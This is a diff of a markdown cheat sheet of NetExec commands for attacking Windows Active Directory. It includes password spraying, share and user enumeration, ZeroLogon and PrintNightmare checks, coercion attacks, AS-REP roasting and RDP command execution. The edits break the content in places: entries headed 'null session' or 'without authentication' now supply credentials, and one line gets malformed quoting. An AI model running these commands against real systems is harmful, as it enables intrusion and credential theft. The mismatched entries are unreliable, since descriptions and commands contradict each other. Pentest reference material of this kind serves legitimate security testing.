@@ -41,7 +41,7 @@ Attempt SMB null session authentication (anonymous access).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/AUTH
 ```bash
-nxc smb <ip> -u '' -p ''
+nxc smb <ip> -u <user> -p '<password>'
 ```
 
 ## nxc - local authentication with NTLM hash
@@ -70,28 +70,12 @@ nxc smb <ip> -u '<computer_account>' -H <hash> --delegate <target_user> --self
 
 ### Password Spraying
 
-## nxc - password spray multiple users
-Test one password against multiple usernames.
-
-#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
-```bash
-nxc smb <ip> -u user1 user2 user3 -p <password>
-```
-
-## nxc - password spray multiple passwords
-Test multiple passwords against one username.
-
-#platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
-```bash
-nxc smb <ip> -u <user> -p password1 password2 password3
-```
-
 ## nxc - password spray with user file
 Test one password against a list of users from file.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
 ```bash
-nxc smb <ip> -u <userfile> -p <password>
+nxc smb <ip> -u <userfile> -p '<password>'
 ```
 
 ## nxc - password spray with password file
@@ -107,7 +91,7 @@ Continue password spraying even after finding valid credentials.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/BRUTEFORCE
 ```bash
-nxc smb <ip> -u <userfile> -p <password> --continue-on-success
+nxc smb <ip> -u <userfile> -p '<password>' --continue-on-success
 ```
 
 ## nxc - check username equals password
@@ -141,7 +125,7 @@ List SMB shares using null session (no credentials).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 ```bash
-nxc smb <ip> -u '' -p '' --shares
+nxc smb <ip> -u <user> -p '<password>' --shares
 ```
 
 ## nxc - enumerate users with null session
@@ -149,7 +133,7 @@ List domain users using null session.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 ```bash
-nxc smb <ip> -u '' -p '' --users
+nxc smb <ip> -u <user> -p '<password>' --users
 ```
 
 ## nxc - enumerate groups with null session
@@ -157,7 +141,7 @@ List domain groups using null session.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 ```bash
-nxc smb <ip> -u '' -p '' --groups
+nxc smb <ip> -u <user> -p '<password>' --groups
 ```
 
 ## nxc - enumerate password policy with null session
@@ -165,7 +149,7 @@ Retrieve domain password policy using null session.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 ```bash
-nxc smb <ip> -u '' -p '' --pass-pol
+nxc smb <ip> -u <user> -p '<password>' --pass-pol
 ```
 
 ## nxc - enumerate shares and permissions
@@ -759,7 +743,7 @@ Test if Domain Controller is vulnerable to ZeroLogon (CVE-2020-1472).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M zerologon
+nxc smb <ip> -u <user> -p '<password>' -M zerologon
 ```
 
 ## nxc - check for noPAC
@@ -775,7 +759,7 @@ Test if system is vulnerable to PrintNightmare (CVE-2021-34527).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M printnightmare
+nxc smb <ip> -u <user> -p '<password>' -M printnightmare
 ```
 
 ## nxc - check for SMBGhost
@@ -783,7 +767,7 @@ Test if system is vulnerable to SMBGhost (CVE-2020-0796).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M smbghost
+nxc smb <ip> -u <user> -p '<password>' -M smbghost
 ```
 
 ## nxc - check for MS17-010
@@ -791,7 +775,7 @@ Test if system is vulnerable to EternalBlue (MS17-010).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M ms17-010
+nxc smb <ip> -u <user> -p '<password>' -M ms17-010
 ```
 
 ## nxc - check for NTLM reflection
@@ -807,7 +791,7 @@ Test for various coerce vulnerabilities (PetitPotam, etc).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M coerce_plus
+nxc smb <ip> -u <user> -p '<password>' -M coerce_plus
 ```
 
 ## nxc - coerce with listener IP
@@ -815,7 +799,7 @@ Attempt coerce attack with specified listener IP.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<listener_ip>
+nxc smb <ip> -u <user> -p '<password>' -M coerce_plus -o LISTENER=<listener_ip>
 ```
 
 ## nxc - coerce with all methods
@@ -823,7 +807,7 @@ Try all coerce methods (PetitPotam, DFSCoerce, etc).
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<listener_ip> ALWAYS=true
+nxc smb <ip> -u <user> -p '<password>' -M coerce_plus -o LISTENER=<listener_ip> ALWAYS=true
 ```
 
 ## nxc - check specific coerce method
@@ -831,7 +815,7 @@ Test specific coerce vulnerability method.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/VULN
 ```bash
-nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=<method_name>
+nxc smb <ip> -u <user> -p '<password>' -M coerce_plus -o METHOD=<method_name>
 ```
 
 ## nxc - check if Spooler service is running
@@ -945,7 +929,7 @@ Generate Kerberos configuration file.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
 ```bash
-netexec smb <ip> -u <user> -p '<password>' --generate-krb5-file <path>
+nxc smb <ip> -u <user> -p '<password>' --generate-krb5-file <path>
 ```
 
 ## nxc - generate TGT
@@ -953,7 +937,7 @@ Request and save Kerberos TGT ticket.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
 ```bash
-netexec smb <ip> -u <user> -p '<password>' --generate-tgt <path>
+nxc smb <ip> -u <user> -p '<password>' --generate-tgt <path>
 ```
 
 ## nxc - use Kerberos cache file
@@ -961,7 +945,7 @@ Authenticate using existing Kerberos ticket cache.
 
 #platform/windows #target/remote #port/445 #port/139 #protocol/smb #cat/KERBEROS
 ```bash
-netexec smb <ip> -u <user> -k --use-kcache
+nxc smb <ip> -u <user> -k --use-kcache
 ```
 
 ### Getting Shells
@@ -1019,7 +1003,7 @@ Test if accounts exist without Kerberos pre-auth.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/AUTH
 ```bash
-nxc ldap <ip> -u <userfile> -p '' -k
+nxc ldap <ip> -u <userfile> -p '<password>' -k
 ```
 
 ### User Enumeration
@@ -1089,7 +1073,7 @@ Kerberoast using AS-REP roastable accounts.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
 ```bash
-nxc ldap <ip> -u <user> -p '' --no-preauth-targets <userfile> --kerberoasting <output_file>
+nxc ldap <ip> -u <user> -p '<password>' --no-preauth-targets <userfile> --kerberoasting <output_file>
 ```
 
 ## nxc - ASREPRoast without authentication
@@ -1097,7 +1081,7 @@ AS-REP roast without valid credentials.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
 ```bash
-nxc ldap <ip> -u <user> -p '' --asreproast <output_file>
+nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file>
 ```
 
 ## nxc - ASREPRoast with user list
@@ -1105,7 +1089,7 @@ Test multiple users for AS-REP roasting.
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/CREDENTIALS
 ```bash
-nxc ldap <ip> -u <userfile> -p '' --asreproast <output_file>
+nxc ldap <ip> -u <userfile> -p '<password>' --asreproast <output_file>
 ```
 
 ## nxc - ASREPRoast with authentication
@@ -1399,7 +1383,7 @@ Extract Password Settings Objects (PSO/FGPP).
 
 #platform/windows #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-netexec ldap <ip> -u <user> -p '<password>' --pso
+nxc ldap <ip> -u <user> -p '<password>' --pso
 ```
 
 
@@ -1863,7 +1847,7 @@ Execute command via RDP (beta feature).
 
 #platform/windows #target/remote #port/3389 #protocol/rdp #cat/EXECUTION
 ```bash
-netexec rdp <ip> -u <user> -p '<password>' -x <command>
+nxc rdp <ip> -u <user> -p '<password>' -x <command>
 ```
 
 ## nxc - execute via RDP with custom delays
@@ -1871,7 +1855,7 @@ Execute via RDP with timing adjustments.
 
 #platform/windows #target/remote #port/3389 #protocol/rdp #cat/EXECUTION
 ```bash
-netexec rdp <ip> -u <user> -p '<password>' -x <command> --cmd-delay <seconds> --clipboard-delay <seconds>
+nxc rdp <ip> -u <user> -p '<password>' -x <command> --cmd-delay <seconds> --clipboard-delay <seconds>
 ```
 
 
@@ -2039,7 +2023,7 @@ Use credentials that start with dash character.
 
 #platform/any #target/remote #protocol/any #cat/AUTH
 ```bash
-nxc <protocol> <ip> -u='-<username>' -p='-<password>'
+nxc <protocol> <ip> -u='-<username>' -p='-'<password>''
 ```
 
 ## nxc - continue on success
@@ -2099,7 +2083,7 @@ Use password-protected PFX certificate.
 
 #platform/windows #target/remote #protocol/smb #cat/AUTH
 ```bash
-nxc smb <ip> --pfx-cert <cert_file> --pfx-pass <password> -u <user>
+nxc smb <ip> --pfx-cert <cert_file> --pfx-pass '<password>' -u <user>
 ```
 
 ## nxc - authenticate with base64 PFX
@@ -2192,16 +2176,6 @@ Execute multiple modules in sequence.
 #platform/any #target/remote #protocol/any #cat/USAGE
 ```bash
 nxc <protocol> <ip> -u <user> -p '<password>' -M <module1> -M <module2> -M <module3>
-```
-
-### Database
-
-## nxc - initialize database
-Initialize NXC database.
-
-#platform/any #target/local #cat/USAGE
-```bash
-nxcdb
 ```
 
 ### Logging
@@ -2340,7 +2314,7 @@ AS-REP roast without valid credentials.
 
 #platform/linux #target/remote #port/389 #port/636 #protocol/ldap #cat/RECON
 ```bash
-nxc ldap <ip> -u <user> -p '' --asreproast <output_file> --kdcHost <dc_ip>
+nxc ldap <ip> -u <user> -p '<password>' --asreproast <output_file> --kdcHost <dc_ip>
 ```
 
 ## nxc - Kerberoast with kdcHost
